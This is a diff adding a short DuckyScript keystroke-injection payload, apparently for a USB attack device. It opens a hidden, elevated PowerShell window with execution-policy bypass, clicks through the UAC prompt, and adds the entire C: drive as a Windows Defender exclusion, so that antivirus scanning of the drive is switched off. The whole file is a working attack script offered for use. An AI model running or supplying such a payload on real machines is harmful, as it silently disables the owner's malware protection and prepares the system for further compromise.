@@ -1,0 +1,23 @@
+REM Title: Add Exclusion C-drive
+REM Author: @beigeworm | https://github.com/beigeworm
+REM Description: Uses Powershell to add an exclusion to Windows Defender to ingore any files within C:/
+REM Target: Windows 10
+
+REM some setup for dukie script.
+DEFAULT_DELAY 100
+
+REM open powershell (remove -W Hidden to show the window).
+GUI r
+DELAY 750
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass
+CTRL-SHIFT ENTER
+DELAY 1500
+ALT y
+DELAY 5000
+
+REM add the exclusion path.
+STRING Add-MpPreference -ExclusionPath C:\
+ENTER
+DELAY 250
+STRING exit
+ENTER
